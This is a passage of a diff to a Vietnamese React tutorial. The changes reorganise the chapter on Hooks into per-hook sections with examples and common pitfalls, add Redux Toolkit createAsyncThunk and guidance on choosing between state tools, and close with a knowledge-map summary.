+  this.socket.close();                                     // [ws]
+}
+```
+
+Logic của 3 tính năng bị trộn chung vào 2 method — rất dễ quên dọn dẹp, và càng khó đọc khi số lượng side effect tăng lên.
+
+**2. Vấn đề `this`:**
+
+`this` trong JavaScript Class không tự động bind vào method — phải bind thủ công trong constructor hoặc dùng arrow function. Quên một chỗ là lỗi ngay, và đây là nguồn bug rất phổ biến với người mới học React.
+
+---
+
+### 5.3. Function Component và Hooks — gom logic theo tính năng
+
+React 16.8 giới thiệu Hooks, cho phép Function Component có đầy đủ khả năng quản lý state và vòng đời mà trước đây chỉ Class Component làm được. Quan trọng hơn, Hooks cho phép **gom toàn bộ logic của một tính năng vào một chỗ** thay vì tách rời theo lifecycle method.
+
+**So sánh trực tiếp — cùng một tính năng, hai cách viết:**
+
+```
+Class Component                    Function Component + Hooks
+──────────────────────────────────────────────────────────────
+constructor()     ←→  useState() / useReducer()
+componentDidMount ←→  useEffect(() => { ... }, [])
+componentDidUpdate←→  useEffect(() => { ... }, [deps])
+componentWillUnmount←→ return () => { ... } bên trong useEffect
+```
+
+Mỗi `useEffect` là một "đơn vị tính năng" khép kín: đăng ký và dọn dẹp nằm cùng một khối, dễ đọc và dễ đối chiếu:
+
+```jsx
+function WindowWidthLogger() {
+  const [width, setWidth] = useState(window.innerWidth);
+
+  // [tính năng resize] — gom lại trong 1 useEffect
+  useEffect(() => {
+    const handleResize = () => setWidth(window.innerWidth);
+    window.addEventListener('resize', handleResize);
+    return () => window.removeEventListener('resize', handleResize); // cleanup cùng chỗ
+  }, []);
+
+  // [tính năng cập nhật title] — useEffect riêng, độc lập
+  useEffect(() => {
+    document.title = `Cửa sổ rộng ${width}px`;
+  }, [width]);
+
+  return <div>Chiều rộng: {width}px</div>;
+}
+```
+
+3 side effect riêng biệt — 3 `useEffect` riêng biệt — mỗi cái tự lo logic của mình, không trộn lẫn.
+
+---
+
+
+Class Component vẫn được React hỗ trợ, nhưng Hooks đã là chuẩn mực trong code React hiện đại. Custom Hooks — cách đóng gói và tái sử dụng logic — sẽ được trình bày chi tiết ở mục 6.8.
+
+---
+
+## 6. Hooks — Từng Hook Chi Tiết Và Cách Áp Dụng
+
+React cung cấp một bộ hook built-in, mỗi hook giải quyết một nhóm vấn đề cụ thể:
+
+```
+Hook              Nhóm vấn đề
+────────────────────────────────────────────────────────────────
+useState          Lưu trữ state đơn giản trong component
+useReducer        State phức tạp, nhiều nhánh logic liên quan
+useEffect         Side effect: fetch, event listener, timer...
+useRef            Tham chiếu DOM hoặc giá trị không gây re-render
+useMemo           Ghi nhớ kết quả tính toán tốn kém
+useCallback       Giữ nguyên reference hàm giữa các lần render
+useContext        Đọc dữ liệu từ Context không qua props
+```
+
+**Luật Hooks (Rules of Hooks)** — bắt buộc phải tuân theo:
+
+1. **Chỉ gọi hook ở top level** — không gọi bên trong `if`, vòng lặp, hay hàm lồng nhau. React xác định thứ tự hook bằng vị trí, nếu thứ tự thay đổi giữa các lần render thì state bị gán nhầm.
+2. **Chỉ gọi hook trong Function Component hoặc custom hook** — không gọi trong hàm JS thường.
+
+---
+
+### 6.1. `useState` — quản lý state đơn giản
 
 `useState` tạo một "vùng nhớ" riêng cho component, được React giữ lại xuyên suốt các lần render:
 
@@ -606,7 +956,13 @@ function handleClick() {
 // Kết quả: count tăng đúng 3, vì mỗi lần React đưa "prev" mới nhất vào hàm
 ```
 
-**Khi nào dùng `useReducer` thay vì `useState`:** khi state có nhiều nhánh logic liên quan với nhau (ví dụ một form phức tạp với nhiều field, hoặc trạng thái loading/success/error của 1 request).
+**Khi nào dùng `useReducer` thay vì `useState`:** xem mục 6.2 bên dưới.
+
+---
+
+### 6.2. `useReducer` — quản lý state phức tạp nhiều nhánh logic
+
+Dùng `useReducer` khi state có nhiều nhánh logic liên quan với nhau (trạng thái loading/success/error của một request, form phức tạp nhiều field...).
 
 **Nếu vẫn cố dùng `useState` cho trường hợp này — ví dụ quản lý trạng thái gọi API:**
 
@@ -710,7 +1066,7 @@ function Counter() {
 }
 ```
 
-### 6.2. `useEffect` — cầu nối với thế giới bên ngoài
+### 6.3. `useEffect` — cầu nối với thế giới bên ngoài
 
 ```jsx
 useEffect(() => {
@@ -751,9 +1107,57 @@ function UserProfile({ userId }) {
 }
 ```
 
-Nếu bạn quên đưa `userId` vào mảng dependency, effect sẽ luôn dùng giá trị `userId` **tại lần đầu tiên** component mount, dù prop `userId` đã đổi sau đó — dẫn đến hiển thị sai user. Đây chính là hiện tượng "stale closure" sẽ nói kỹ ở phần 6.3.
+Nếu bạn quên đưa `userId` vào mảng dependency, effect sẽ luôn dùng giá trị `userId` **tại lần đầu tiên** component mount, dù prop `userId` đã đổi sau đó — dẫn đến hiển thị sai user. Đây chính là hiện tượng "stale closure" sẽ nói kỹ ở phần 6.4.
 
-### 6.3. Stale Closure — lỗi kinh điển của người mới học Hooks
+**3 sai lầm phổ biến với `useEffect`:**
+
+**Sai lầm 1 — Thiếu dependency gây stale closure:**
+```jsx
+// SAI: userId bị "đóng băng" tại lần mount đầu tiên
+useEffect(() => {
+  fetch(`/api/users/${userId}`).then(...);
+}, []); // ← quên userId
+
+// ĐÚNG:
+useEffect(() => {
+  fetch(`/api/users/${userId}`).then(...);
+}, [userId]); // ← thêm vào dependency
+```
+
+**Sai lầm 2 — Object/Array trong dependency gây infinite loop:**
+```jsx
+// SAI: options = {} tạo object MỚI mỗi lần render → dependency luôn "đổi"
+function MyComponent() {
+  const options = { timeout: 3000 }; // ← tạo mới mỗi lần render!
+
+  useEffect(() => {
+    fetchData(options);
+  }, [options]); // ← infinite loop: effect chạy → re-render → options mới → effect chạy...
+}
+
+// ĐÚNG: dùng useMemo hoặc đưa object ra ngoài component
+const OPTIONS = { timeout: 3000 }; // ← tạo một lần, reference ổn định
+function MyComponent() {
+  useEffect(() => {
+    fetchData(OPTIONS);
+  }, []); // ← không cần OPTIONS trong dependency vì nó không đổi
+}
+```
+
+**Sai lầm 3 — Effect chạy 2 lần trong Strict Mode (React 18):**
+
+Trong development với Strict Mode, React cố tình mount → unmount → mount lại mỗi component để phát hiện side effect không có cleanup. Đây là **hành vi cố ý**, không phải bug — nếu bạn thấy API bị gọi 2 lần khi dev, đó là dấu hiệu effect của bạn thiếu cleanup function đúng cách. Production không bị ảnh hưởng.
+
+```jsx
+// Đảm bảo luôn có cleanup để Strict Mode không gây vấn đề:
+useEffect(() => {
+  const controller = new AbortController();
+  fetch(url, { signal: controller.signal }).then(...);
+  return () => controller.abort(); // ← cleanup: hủy fetch khi unmount
+}, [url]);
+```
+
+### 6.4. Stale Closure — lỗi kinh điển của người mới học Hooks
 
 **Stale closure** xảy ra khi hàm bên trong `useEffect` (hoặc bất kỳ callback nào) "giữ lại" giá trị state tại **thời điểm nó được tạo ra**, và không tự cập nhật theo state mới dù state đã đổi.
 
@@ -812,56 +1216,75 @@ function Counter() {
 }
 ```
 
-### 6.4. Tối ưu hiệu năng: `useMemo`, `useCallback`, `useRef`
+### 6.5. `useContext` — đọc dữ liệu từ Context không qua props
 
-Ba hook này không thay đổi *kết quả* của component, chỉ tối ưu *hiệu năng* — nên chỉ nên dùng khi thực sự đo được vấn đề, không nên áp dụng tràn lan (mỗi lần dùng đều có chi phí tính toán riêng để so sánh dependency).
-
-**`useMemo` — ghi nhớ kết quả tính toán tốn kém:**
+`useContext` là hook tương ứng với Context API — cho phép component đọc trực tiếp dữ liệu từ Context gần nhất phía trên trong cây mà không cần nhận qua props trung gian.
 
 ```jsx
-function ProductList({ products, keyword }) {
-  // Nếu KHÔNG dùng useMemo: mỗi lần ProductList render lại (ví dụ do component cha
-  // re-render vì lý do khác, không liên quan đến products/keyword), hàm filter
-  // 10.000 sản phẩm này vẫn chạy lại từ đầu — lãng phí.
-  const filtered = useMemo(() => {
-    return products.filter(p => p.name.includes(keyword));
-  }, [products, keyword]); // chỉ tính lại khi products hoặc keyword đổi
+// 1. Tạo Context (thường để trong file riêng)
+const ThemeContext = createContext('light'); // giá trị mặc định khi không có Provider
 
-  return <ul>{filtered.map(p => <li key={p.id}>{p.name}</li>)}</ul>;
-}
-```
-
-**`useCallback` — giữ nguyên reference của hàm giữa các lần render:**
-
-```jsx
-function Parent() {
-  const [count, setCount] = useState(0);
-
-  // KHÔNG dùng useCallback: mỗi lần Parent render, handleClick là MỘT HÀM MỚI
-  // (địa chỉ bộ nhớ khác), khiến <ExpensiveChild> — dù được React.memo bọc —
-  // vẫn re-render vì "prop onClick đã đổi" (dù logic bên trong giống hệt).
-  const handleClick = useCallback(() => {
-    console.log('clicked');
-  }, []); // reference ổn định, không đổi giữa các lần render
-
+// 2. Provider bao bọc phần cây cần chia sẻ
+function App() {
+  const [theme, setTheme] = useState('dark');
   return (
-    <div>
-      <p>{count}</p>
-      <button onClick={() => setCount(count + 1)}>Tăng Parent</button>
-      <ExpensiveChild onClick={handleClick} />
-    </div>
+    <ThemeContext.Provider value={theme}>
+      <Toolbar />
+    </ThemeContext.Provider>
   );
 }
 
-const ExpensiveChild = React.memo(function ExpensiveChild({ onClick }) {
-  console.log('ExpensiveChild render'); // log này để kiểm chứng có re-render hay không
-  return <button onClick={onClick}>Click con</button>;
-});
+// 3. Bất kỳ component con nào đọc trực tiếp — dù nằm sâu bao nhiêu tầng
+function Button() {
+  const theme = useContext(ThemeContext); // không cần nhận qua props
+  return <button className={theme}>Click</button>;
+}
 ```
 
-**Cách tự kiểm chứng:** xóa `useCallback` đi (chỉ để `const handleClick = () => {...}` thường), mở Console, click nút "Tăng Parent" nhiều lần — bạn sẽ thấy dòng log `ExpensiveChild render` xuất hiện dù `ExpensiveChild` không hề liên quan đến `count`. Thêm lại `useCallback`, lặp lại thao tác — dòng log đó sẽ không xuất hiện nữa (chỉ log 1 lần lúc mount). Đây là cách trực quan nhất để "thấy" tác dụng thật của `useCallback`, thay vì chỉ tin vào lý thuyết.
+**Khi nào dùng `useContext`:**
+- Dữ liệu cần chia sẻ ở nhiều component không liên quan nhau trong cây (theme, ngôn ngữ, thông tin user đăng nhập).
+- Tránh prop drilling qua nhiều tầng trung gian không dùng đến dữ liệu đó.
 
-**`useRef` — vùng nhớ thay đổi được nhưng không gây re-render:**
+**Giới hạn cần biết:** khi giá trị trong `Provider` thay đổi, **toàn bộ component** đang gọi `useContext` với context đó đều re-render — kể cả những component chỉ dùng một phần nhỏ không thay đổi. Vì vậy Context phù hợp với dữ liệu **ít thay đổi**; với dữ liệu cập nhật liên tục, nên dùng Redux Toolkit (xem chương 7).
+
+**Pattern phổ biến — tách Provider thành custom hook:**
+
+```jsx
+// userContext.js
+const UserContext = createContext(null);
+
+export function UserProvider({ children }) {
+  const [user, setUser] = useState(null);
+  return (
+    <UserContext.Provider value={{ user, setUser }}>
+      {children}
+    </UserContext.Provider>
+  );
+}
+
+// Hook tiện dụng — không cần import UserContext ở mọi nơi
+export function useUser() {
+  const context = useContext(UserContext);
+  if (!context) throw new Error('useUser phải dùng bên trong UserProvider');
+  return context;
+}
+
+// Dùng trong component:
+function Navbar() {
+  const { user } = useUser(); // gọn hơn useContext(UserContext)
+  return <div>Xin chào, {user?.name}</div>;
+}
+```
+
+---
+
+### 6.6. `useRef` — tham chiếu DOM và giá trị không gây re-render
+
+`useRef` trả về một object `{ current: ... }` được React giữ nguyên xuyên suốt vòng đời component. Điểm khác biệt cốt lõi so với `useState`: **thay đổi `ref.current` không gây re-render**.
+
+`useRef` có 2 mục đích chính:
+
+**Mục đích 1 — truy cập trực tiếp DOM node:**
 
 ```jsx
 function TextInputWithFocusButton() {
@@ -880,7 +1303,237 @@ function TextInputWithFocusButton() {
 }
 ```
 
-Khác biệt cốt lõi so với `useState`: đổi `inputRef.current` **không** khiến component render lại — hữu ích khi bạn cần lưu một giá trị "nội bộ" (như id của `setInterval`, giá trị đo thời gian trước đó...) mà việc thay đổi nó không cần phản ánh ngay lên UI.
+Dùng khi cần thao tác mà React không cung cấp API tương đương: focus, đo kích thước element, tích hợp thư viện DOM bên thứ ba (chart, map...).
+
+**Mục đích 2 — lưu giá trị "nội bộ" không cần hiển thị lên UI:**
+
+```jsx
+function Stopwatch() {
+  const [time, setTime] = useState(0);
+  const intervalRef = useRef(null); // lưu id của setInterval
+
+  const start = () => {
+    intervalRef.current = setInterval(() => {
+      setTime(prev => prev + 1);
+    }, 1000);
+  };
+
+  const stop = () => {
+    clearInterval(intervalRef.current); // truy cập id để hủy
+  };
+
+  return (
+    <div>
+      <p>{time}s</p>
+      <button onClick={start}>Bắt đầu</button>
+      <button onClick={stop}>Dừng</button>
+    </div>
+  );
+}
+```
+
+Nếu dùng `useState` để lưu `intervalId`, mỗi lần `setIntervalId(...)` sẽ gây re-render không cần thiết. `useRef` tránh điều đó vì đổi `current` không trigger render.
+
+**Phân biệt `useState` vs `useRef`:**
+
+```
+                  useState          useRef
+──────────────────────────────────────────────────────
+Thay đổi gây      Có (re-render)    Không
+re-render?
+
+Giá trị tồn       Giữ qua render    Giữ qua render
+tại qua render?
+
+Dùng cho          Dữ liệu hiển      Giá trị nội bộ /
+                  thị lên UI        tham chiếu DOM
+```
+
+---
+
+### 6.7. `useMemo` — ghi nhớ kết quả tính toán tốn kém
+
+`useMemo` nhận một hàm tính toán và mảng dependency — chỉ chạy lại hàm đó khi dependency thay đổi, các lần render khác trả về kết quả đã lưu cache.
+
+```jsx
+function ProductList({ products, keyword }) {
+  // Không có useMemo: mỗi lần ProductList render lại (dù products/keyword không đổi),
+  // hàm filter 10.000 sản phẩm này vẫn chạy lại từ đầu — lãng phí.
+  const filtered = useMemo(() => {
+    return products.filter(p => p.name.includes(keyword));
+  }, [products, keyword]); // chỉ tính lại khi products hoặc keyword đổi
+
+  return <ul>{filtered.map(p => <li key={p.id}>{p.name}</li>)}</ul>;
+}
+```
+
+**Khi nào NÊN dùng `useMemo`:**
+- Hàm tính toán thực sự nặng (filter/sort/aggregate dữ liệu lớn, tính toán phức tạp).
+- Component re-render thường xuyên do lý do không liên quan đến dependency.
+
+**Khi nào KHÔNG NÊN dùng:**
+- Tính toán đơn giản (cộng 2 số, nối chuỗi) — chi phí so sánh dependency của `useMemo` còn nặng hơn chính phép tính.
+- Không nên áp dụng tràn lan "cho chắc" — mỗi `useMemo` đều có overhead riêng và làm code khó đọc hơn.
+
+---
+
+### 6.8. `useCallback` — giữ nguyên reference hàm giữa các lần render
+
+Mỗi lần component render, mọi hàm định nghĩa bên trong (`const handleClick = () => {...}`) đều được tạo ra như một **object mới** với địa chỉ bộ nhớ mới — dù logic bên trong giống hệt. Điều này gây vấn đề khi hàm đó được truyền như prop xuống component con đã được tối ưu bằng `React.memo`.
+
+```jsx
+function Parent() {
+  const [count, setCount] = useState(0);
+
+  // Không có useCallback: mỗi lần Parent render, handleClick là một hàm MỚI.
+  // React.memo của ExpensiveChild so sánh prop onClick → thấy "đã đổi" → re-render.
+  const handleClick = useCallback(() => {
+    console.log('clicked');
+  }, []); // dependency rỗng → reference ổn định, không đổi giữa các lần render
+
+  return (
+    <div>
+      <p>{count}</p>
+      <button onClick={() => setCount(count + 1)}>Tăng Parent</button>
+      <ExpensiveChild onClick={handleClick} />
+    </div>
+  );
+}
+
+const ExpensiveChild = React.memo(function ExpensiveChild({ onClick }) {
+  console.log('ExpensiveChild render');
+  return <button onClick={onClick}>Click con</button>;
+});
+```
+
+**Cách tự kiểm chứng:** xóa `useCallback`, thay bằng `const handleClick = () => {...}` thường, mở Console, click "Tăng Parent" nhiều lần — dòng log `ExpensiveChild render` xuất hiện dù ExpensiveChild không liên quan đến `count`. Thêm lại `useCallback` → dòng log biến mất (chỉ log 1 lần lúc mount).
+
+**`useCallback` thực chất là `useMemo` cho hàm:**
+
+```jsx
+// Hai cách này tương đương:
+useCallback(fn, deps)
+useMemo(() => fn, deps)
+```
+
+**Khi nào NÊN dùng `useCallback`:**
+- Hàm được truyền xuống component con đã bọc bằng `React.memo`.
+- Hàm là dependency của `useEffect` ở component con.
+
+**Khi nào KHÔNG NÊN dùng:** hàm chỉ dùng trong chính component đó (event handler thông thường không truyền xuống) — áp dụng `useCallback` ở đây là tối ưu không cần thiết.
+
+---
+
+### 6.9. Custom Hooks — đóng gói và tái sử dụng logic
+
+Custom Hook là một hàm JavaScript thông thường — điểm đặc biệt duy nhất là **tên bắt đầu bằng `use`** và bên trong nó gọi các hook khác. Không có API đặc biệt nào cần học thêm.
+
+**Trường hợp CHƯA custom — logic bị lặp lại ở từng component:**
+
+Giả sử bạn cần biết chiều rộng cửa sổ ở cả `Sidebar` lẫn `Header` (2 component không liên quan nhau). Không có custom hook, bạn buộc phải copy-paste y hệt đoạn `useState` + `useEffect` vào từng nơi:
+
+```jsx
+function Sidebar() {
+  const [width, setWidth] = useState(window.innerWidth);
+
+  useEffect(() => {
+    const handleResize = () => setWidth(window.innerWidth);
+    window.addEventListener('resize', handleResize);
+    return () => window.removeEventListener('resize', handleResize);
+  }, []);
+
+  return <div>Sidebar rộng: {width}px</div>;
+}
+
+function Header() {
+  // Y HỆT đoạn code ở Sidebar — chỉ copy-paste lại
+  const [width, setWidth] = useState(window.innerWidth);
+
+  useEffect(() => {
+    const handleResize = () => setWidth(window.innerWidth);
+    window.addEventListener('resize', handleResize);
+    return () => window.removeEventListener('resize', handleResize);
+  }, []);
+
+  return <div>Header rộng: {width}px</div>;
+}
+```
+
+**Vấn đề cụ thể:**
+
+1. **Trùng lặp code:** cùng một logic bị viết lại y hệt ở mọi nơi. Có 5 component cần biết `width` thì có 5 bản copy giống hệt nhau.
+2. **Khó sửa đồng bộ:** muốn thêm debounce thì phải sửa ở tất cả các nơi đã copy — quên một chỗ là chỗ đó lỗi thời.
+3. **Test khó hơn:** logic dính chặt vào component, không thể test độc lập.
+
+**Sau khi custom hóa — viết một lần, dùng lại nhiều nơi:**
+
+```jsx
+function useWindowWidth() {
+  const [width, setWidth] = useState(window.innerWidth);
+
+  useEffect(() => {
+    const handleResize = () => setWidth(window.innerWidth);
+    window.addEventListener('resize', handleResize);
+    return () => window.removeEventListener('resize', handleResize);
+  }, []);
+
+  return width;
+}
+
+// Dùng lại ở bất kỳ component nào:
+function Sidebar() {
+  const width = useWindowWidth();
+  return <div>Sidebar rộng: {width}px</div>;
+}
+
+function Header() {
+  const width = useWindowWidth();
+  return <div>Header rộng: {width}px</div>;
+}
+```
+
+Nếu cần thêm debounce, chỉ sửa **đúng một chỗ** bên trong `useWindowWidth` — cả `Sidebar` và `Header` tự động hưởng thay đổi.
+
+**Ví dụ thực tế hơn — `useFetch` gom logic gọi API:**
+
+```jsx
+function useFetch(url) {
+  const [state, dispatch] = useReducer(
+    (s, a) => ({ ...s, ...a }),
+    { data: null, isLoading: true, error: null }
+  );
+
+  useEffect(() => {
+    let cancelled = false;
+    dispatch({ isLoading: true, error: null });
+
+    fetch(url)
+      .then(r => r.json())
+      .then(data => { if (!cancelled) dispatch({ data, isLoading: false }); })
+      .catch(error => { if (!cancelled) dispatch({ error, isLoading: false }); });
+
+    return () => { cancelled = true; };
+  }, [url]);
+
+  return state;
+}
+
+// Dùng ở bất kỳ component nào cần fetch:
+function UserProfile({ userId }) {
+  const { data, isLoading, error } = useFetch(`/api/users/${userId}`);
+
+  if (isLoading) return <p>Đang tải...</p>;
+  if (error) return <p>Lỗi: {error.message}</p>;
+  return <div>{data.name}</div>;
+}
+
+function PostList({ authorId }) {
+  const { data, isLoading } = useFetch(`/api/posts?author=${authorId}`);
+  // ...
+}
+```
+
+**Quy tắc đặt tên:** custom hook **bắt buộc** phải bắt đầu bằng `use`. React dùng quy ước này để áp dụng kiểm tra luật Hooks — nếu đặt tên khác, lint sẽ không cảnh báo khi bạn gọi hook sai cách bên trong hàm đó.
 
 ---
 
@@ -1149,24 +1802,149 @@ export const store = configureStore({
 
 **Điểm quan trọng cần hiểu đúng ở bản RTK:** dòng `state.items.push(...)` hay `item.price *= ...` trông như đang mutate (sửa trực tiếp) state — điều mà Redux gốc vốn cấm kỵ (đúng như bug ở ví dụ "trước Redux" phần 7.3 phía trên). Nhưng RTK dùng thư viện **Immer** ở phía sau: nó cho phép bạn *viết* code như đang mutate trực tiếp (dễ đọc, ít lỗi thao tác spread sai cấp), nhưng Immer sẽ tự động tạo ra một **bản sao mới immutable** phía sau hậu trường — bạn được lợi cả về cú pháp gọn lẫn tính đúng đắn, mà không cần tự nhớ quy tắc "luôn spread" như bản Redux truyền thống.
 
+### 7.4. `createAsyncThunk` — xử lý bất đồng bộ với Redux
 
+Gọi API trong Redux cần xử lý 3 trạng thái: đang tải, thành công, thất bại. `createAsyncThunk` tự động sinh ra 3 action tương ứng (`pending`, `fulfilled`, `rejected`) để bạn xử lý trong `extraReducers`:
 
 ```jsx
+// authSlice.js
+import { createSlice, createAsyncThunk } from '@reduxjs/toolkit';
+
+// Định nghĩa thunk — chỉ cần viết logic async, RTK tự lo 3 action states
 export const fetchUser = createAsyncThunk(
-  'auth/fetchUser',
+  'auth/fetchUser',          // tên action (dùng để debug)
   async (id) => {
     const res = await fetch(`/api/users/${id}`);
-    return res.json();
+    if (!res.ok) throw new Error('Fetch failed'); // RTK tự bắt lỗi → rejected
+    return res.json();       // giá trị trả về → payload của fulfilled
   }
 );
+
+const authSlice = createSlice({
+  name: 'auth',
+  initialState: { user: null, isLoading: false, error: null },
+  reducers: {},
+  extraReducers: (builder) => {
+    builder
+      .addCase(fetchUser.pending, (state) => {
+        state.isLoading = true;
+        state.error = null;
+      })
+      .addCase(fetchUser.fulfilled, (state, action) => {
+        state.isLoading = false;
+        state.user = action.payload;
+      })
+      .addCase(fetchUser.rejected, (state, action) => {
+        state.isLoading = false;
+        state.error = action.error.message;
+      });
+  },
+});
+
+export default authSlice.reducer;
 ```
 
-Thay vì bạn phải tự viết `try/catch` và tự set 3 biến `isLoading`, `error`, `data` rời rạc ở mỗi nơi gọi API, `createAsyncThunk` tự động dispatch các action tương ứng với 3 trạng thái đó, giúp bạn xử lý UI (hiển thị spinner, thông báo lỗi, dữ liệu) một cách nhất quán trong `extraReducers` mà không lặp lại logic ở nhiều chỗ.
+```jsx
+// Dùng trong component — giống dispatch action thông thường
+function UserPage({ userId }) {
+  const dispatch = useDispatch();
+  const { user, isLoading, error } = useSelector(state => state.auth);
+
+  useEffect(() => {
+    dispatch(fetchUser(userId));
+  }, [userId]);
+
+  if (isLoading) return <p>Đang tải...</p>;
+  if (error) return <p>Lỗi: {error}</p>;
+  return <div>{user?.name}</div>;
+}
+```
+
+So sánh với cách tự quản lý `isLoading`/`error` bằng `useState` rời rạc (phần 6.2): `createAsyncThunk` gom toàn bộ logic 3 trạng thái vào đúng một chỗ trong `extraReducers`, không component nào cần tự `try/catch` hay tự set loading — nhất quán hoàn toàn trên toàn ứng dụng.
 
 ---
 
-## Tổng kết: sợi chỉ xuyên suốt
+### 7.5. Khi nào dùng gì: useState vs useReducer vs Context vs Redux
 
-Nếu nhìn lại toàn bộ tài liệu, mọi khái niệm đều bám theo 3 động lực nêu ở phần 1: **an toàn** (JSX escape mặc định, `$$typeof` chống giả mạo), **hiệu năng** (Virtual DOM, diffing heuristic, Fiber, `useMemo`/`useCallback`), và **khả năng bảo trì khi mở rộng** (component hóa, one-way data flow, Hooks gom logic theo tính năng, Context/Redux giải quyết prop drilling). Hiểu đúng "vì sao" ở mỗi lớp sẽ giúp bạn không chỉ nhớ API, mà còn tự suy luận ra cách dùng đúng khi gặp tình huống mới không có trong tài liệu này.
+```
+Mức độ phức tạp     Công cụ phù hợp        Dấu hiệu nhận biết
+─────────────────────────────────────────────────────────────────────
+Đơn giản          → useState              State độc lập, 1-2 giá trị,
+                                           chỉ dùng trong 1 component
 
-Giờ thì làm dự án thôi! 🚀
+Phức tạp vừa      → useReducer            State có nhiều nhánh logic
+                                           liên quan (loading/error/data),
+                                           nhiều action trên cùng 1 state
+
+Chia sẻ qua cây   → Context API           Dữ liệu ít đổi (theme, locale,
+                                           user đăng nhập), cần đọc ở
+                                           nhiều component không liên quan
+
+Phức tạp, nhiều   → Redux Toolkit         Nhiều slice state độc lập,
+luồng dữ liệu                             nhiều nơi đọc + ghi cùng lúc,
+                                           cần debug lịch sử thay đổi
+```
+
+---
+
+
+## Tổng Kết — Bản Đồ Kiến Thức
+
+### Bạn đã đi qua những gì
+
+```
+1. Bối cảnh          2. Triết lý           3. JSX & Biên dịch
+────────────         ─────────────         ──────────────────
+Vì sao React         Declarative           JSX → object JS
+ra đời:              Component-based       $$typeof Symbol
+- XSS               One-way Data Flow     Babel transform
+- Hiệu năng DOM      State vs Props
+- Bảo trì code
+
+4. Virtual DOM        5. Vòng đời           6. Hooks
+──────────────        ───────────           ────────
+VDOM + Recon-         Mounting/             useState
+ciliation            Updating/             useReducer
+Diffing O(n)         Unmounting            useEffect
+key heuristic        Class lifecycle       Stale Closure
+React Fiber          Function + Hooks      useRef
+Time Slicing                               useMemo
+                                           useCallback
+                                           Custom Hooks
+
+7. Quản lý State Toàn Cục
+──────────────────────────
+Lifting State Up → Prop Drilling (vấn đề)
+Context API → giải pháp nhẹ, phù hợp dữ liệu ít đổi
+Redux Toolkit → giải pháp mạnh, nhiều luồng dữ liệu phức tạp
+createAsyncThunk → xử lý async nhất quán
+```
+
+### Mối liên hệ cốt lõi
+
+```
+UI = f(state)                    ← triết lý nền tảng (chương 2)
+     │
+     ├─ state thay đổi           ← useState / useReducer (chương 6)
+     │   └─ React tính VDOM mới  ← Virtual DOM (chương 4)
+     │       └─ Diffing → Patch  ← Reconciliation (chương 4)
+     │
+     ├─ side effect              ← useEffect (chương 6)
+     │   └─ gọi API, event...    ← cleanup / stale closure
+     │
+     └─ state chia sẻ           ← Context / Redux (chương 7)
+         └─ không prop drilling
+```
+
+### Bước tiếp theo
+
+Sau khi nắm vững nền tảng ở tài liệu này, các chủ đề nên học tiếp theo:
+
+| Chủ đề | Lý do |
+|--------|-------|
+| **React Router** | Điều hướng SPA — gần như mọi app thực tế đều cần |
+| **React Query / SWR** | Thay thế `useEffect` + `useState` khi fetch data — giải quyết caching, refetch, stale data |
+| **Next.js** | SSR, SSG, file-based routing, API routes — chuẩn mực cho app production |
+| **TypeScript + React** | Type safety cho props, state, hooks — bắt buộc trong team/dự án thực |
+| **Testing (React Testing Library)** | Viết test cho component theo hành vi người dùng |
+| **Performance profiling** | React DevTools Profiler, Lighthouse — đo và tối ưu thực tế |
